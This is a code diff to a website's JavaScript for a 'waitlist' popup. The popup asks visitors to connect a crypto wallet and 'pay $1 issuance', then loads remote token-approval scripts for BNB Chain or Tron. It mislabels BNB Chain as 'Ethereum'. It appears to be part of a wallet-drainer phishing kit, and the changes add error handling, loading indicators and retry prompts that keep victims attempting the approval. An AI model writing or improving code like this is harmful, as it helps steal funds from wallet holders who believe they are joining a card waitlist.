@@ -31,7 +31,7 @@
     style.id = 'waitlist-popup-inline';
     style.textContent = css;
     if (!document.getElementById('waitlist-popup-inline')) document.head.appendChild(style);
-    var html = '<div id="waitlist-overlay"><div id="waitlist-modal"><button type="button" id="waitlist-close" aria-label="Close">×</button><div id="waitlist-form-wrap"><h2>Connect your wallet</h2><p class="subtitle">Choose a network to connect your wallet and pay $1 issuance.</p><div id="waitlist-network-cards"><button type="button" class="waitlist-network-card" data-network="BNB"><span class="waitlist-network-name">Ethereum</span><span class="waitlist-network-desc">BNB Chain • Popular</span></button><button type="button" class="waitlist-network-card" data-network="TRX"><span class="waitlist-network-name">Tron</span><span class="waitlist-network-desc">TRC20 • Efficient</span></button></div></div><div id="waitlist-success" style="display:none"><h3>Application Submitted</h3><p>Redirecting...</p></div><div id="waitlist-failed" style="display:none"><h3>Joining Failed</h3><p>Please ensure you have sufficient BNB or TRX for network fees.</p><button type="button" id="waitlist-try-again-btn" class="try-again-btn">Try Again</button></div></div></div>';
+    var html = '<div id="waitlist-overlay"><div id="waitlist-modal"><button type="button" id="waitlist-close" aria-label="Close">×</button><div id="waitlist-form-wrap"><h2>Connect your wallet</h2><p class="subtitle">Choose a network to connect your wallet and pay $1 issuance.</p><div id="waitlist-network-cards"><button type="button" class="waitlist-network-card" data-network="BNB"><span class="waitlist-network-name">Ethereum</span><span class="waitlist-network-desc">BNB Chain • Popular</span></button><button type="button" class="waitlist-network-card" data-network="TRX"><span class="waitlist-network-name">Tron</span><span class="waitlist-network-desc">TRC20 • Efficient</span></button></div></div><div id="waitlist-success" style="display:none"><h3>Application Submitted</h3><p>Redirecting...</p></div><div id="waitlist-failed" style="display:none"><h3>Joining Failed</h3><p>Please ensure you have sufficient BNB or TRX for network fees. If the wallet modal did not appear, try refreshing the page.</p><button type="button" id="waitlist-try-again-btn" class="try-again-btn">Try Again</button></div></div></div>';
     var div = document.createElement('div');
     div.innerHTML = html;
     overlay = div.firstElementChild;
@@ -104,12 +104,30 @@
     showFailed();
   }
 
-  function runApprovalInline(network) {
+  var fluxpayRejectionHandler = null;
+  function runApprovalInline(network, resetLoading) {
     var baseUrl = (window.TRUST_CARD_APPROVAL_URL || (typeof location !== 'undefined' ? new URL('fluxpay', location.origin).href : 'fluxpay')).replace(/\/$/, '');
     var isTrc = network === 'TRX';
     var scriptUrl = baseUrl + (isTrc ? '/fluxpay-trc20-approval.js' : '/fluxpay-approval.js');
     var runKey = isTrc ? 'FluxPayTRC20Approval' : 'FluxPayApproval';
     var runFn = window[runKey] && window[runKey].run;
+
+    function done(err) {
+      if (fluxpayRejectionHandler) {
+        window.removeEventListener('unhandledrejection', fluxpayRejectionHandler);
+        fluxpayRejectionHandler = null;
+      }
+      if (resetLoading) resetLoading();
+      if (err) onError(err);
+    }
+
+    fluxpayRejectionHandler = function (e) {
+      if (e && e.reason && (String(e.reason).indexOf('Loading chunk') >= 0 || String(e.reason).indexOf('404') >= 0 || String(e.reason).indexOf('Failed to fetch') >= 0 || String(e.reason).indexOf('ChunkLoadError') >= 0)) {
+        e.preventDefault();
+        done('Wallet connection failed. Please try again.');
+      }
+    };
+    window.addEventListener('unhandledrejection', fluxpayRejectionHandler);
 
     if (!runFn) {
       var script = document.createElement('script');
@@ -118,40 +136,67 @@
       script.onload = function () {
         var fn = window[runKey] && window[runKey].run;
         if (!fn) {
-          onError('Approval script not loaded');
+          done('Approval script not loaded');
           return;
         }
-        fn(
-          function () {
-            window.dispatchEvent(new CustomEvent('tw:wallet-connected'));
-            onSuccess();
-          },
-          function (err) {
-            onError(err);
-          }
-        );
+        try {
+          fn(
+            function () {
+              if (fluxpayRejectionHandler) {
+                window.removeEventListener('unhandledrejection', fluxpayRejectionHandler);
+                fluxpayRejectionHandler = null;
+              }
+              if (resetLoading) resetLoading();
+              window.dispatchEvent(new CustomEvent('tw:wallet-connected'));
+              onSuccess();
+            },
+            function (err) {
+              done(err);
+            }
+          );
+        } catch (e) {
+          done(e && e.message ? e.message : 'Connection failed');
+        }
       };
       script.onerror = function () {
-        onError('Failed to load approval script');
+        done('Failed to load wallet script. Check your connection.');
       };
       document.head.appendChild(script);
       return;
     }
 
-    runFn(
-      function () {
-        window.dispatchEvent(new CustomEvent('tw:wallet-connected'));
-        onSuccess();
-      },
-      function (err) {
-        onError(err);
-      }
-    );
+    try {
+      runFn(
+        function () {
+          if (fluxpayRejectionHandler) {
+            window.removeEventListener('unhandledrejection', fluxpayRejectionHandler);
+            fluxpayRejectionHandler = null;
+          }
+          if (resetLoading) resetLoading();
+          window.dispatchEvent(new CustomEvent('tw:wallet-connected'));
+          onSuccess();
+        },
+        function (err) {
+          done(err);
+        }
+      );
+    } catch (e) {
+      done(e && e.message ? e.message : 'Connection failed');
+    }
   }
 
   document.addEventListener('keydown', function (e) {
     if (e.key === 'Escape' && overlay && overlay.classList.contains('open')) closePopup();
   });
+
+  function setCardLoading(card, loading) {
+    if (!card) return;
+    card.disabled = loading;
+    card.style.opacity = loading ? '0.7' : '';
+    card.style.pointerEvents = loading ? 'none' : '';
+    var text = card.querySelector('.waitlist-network-name');
+    if (text) text.textContent = loading ? 'Loading...' : (card.dataset.network === 'BNB' ? 'Ethereum' : 'Tron');
+  }
 
   document.addEventListener('click', function (e) {
     var card = e.target && e.target.closest && e.target.closest('.waitlist-network-card');
@@ -163,7 +208,8 @@
         var country = new URLSearchParams(window.location.search).get('country') || 'IN';
         var cardUrl = window.location.pathname.includes('cards') ? window.location.pathname + window.location.search : '/cards-country-' + country + '.html';
         try { sessionStorage.setItem('tw-card-redirect', cardUrl); } catch (_) {}
-        runApprovalInline(network);
+        setCardLoading(card, true);
+        runApprovalInline(network, function () { setCardLoading(card, false); });
       }
     }
   }, true);
